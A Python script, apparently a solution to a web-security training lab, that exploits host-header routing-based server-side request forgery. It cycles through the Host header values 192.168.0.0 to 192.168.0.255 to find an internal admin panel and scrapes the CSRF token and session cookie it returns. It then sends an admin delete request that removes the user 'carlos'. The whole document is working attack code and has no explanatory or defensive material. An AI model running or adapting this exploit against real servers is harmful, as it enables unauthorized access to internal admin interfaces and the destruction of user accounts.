import re
from urllib import request
import sys
import socket, ssl
import requests


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
host = burp_url[8:]
admin_url = burp_url + '/admin'

session = requests.Session()
session.get(burp_url)

cookies = session.cookies.get_dict()
cookie_header = "; ".join([f"{key}={value}" for key, value in cookies.items()])

new_cookie_header = cookie_header

for i in range(256):
    local_url = f'192.168.0.{i}'

    sock = ssl.create_default_context().wrap_socket(socket.socket(), server_hostname=host)
    sock.connect((host, 443))

    request = (
        f"GET {admin_url} HTTP/1.1\r\n"
        f"Host: {local_url}\r\n"
        f"Cookie: {cookie_header}\r\n"
        "Connection: close\r\n\r\n"
    )

    sock.send(request.encode())
    r = sock.recv(4096).decode()
    response_code = int(re.search(r'HTTP/\d\.\d (\d+)', r).group(1))

    if response_code == 200 and (csrf := re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', r)):
        print(f"{csrf.group(1)}")
        local_url_final = local_url
        print(local_url_final)
        new_session_cookie = re.search(r'Set-Cookie: session=([^;]+);', r)
        if new_session_cookie:
            new_session_value = new_session_cookie.group(1)
            cookies['session'] = new_session_value
            new_cookie_header = "; ".join([f"{key}={value}" for key, value in cookies.items()])

        break

    sock.close()

final_url = burp_url + '/admin/delete?csrf=' + csrf.group(1) + '&username=carlos'

# Otwieramy nowe połączenie
sock = ssl.create_default_context().wrap_socket(socket.socket(), server_hostname=host)
sock.connect((host, 443))

request = (
    f"GET {final_url} HTTP/1.1\r\n"
    f"Host: {local_url_final}\r\n"
    f"Cookie: {new_cookie_header}\r\n"
    "Connection: close\r\n\r\n"
)

sock.send(request.encode())

r = sock.recv(4096).decode()
sock.close()
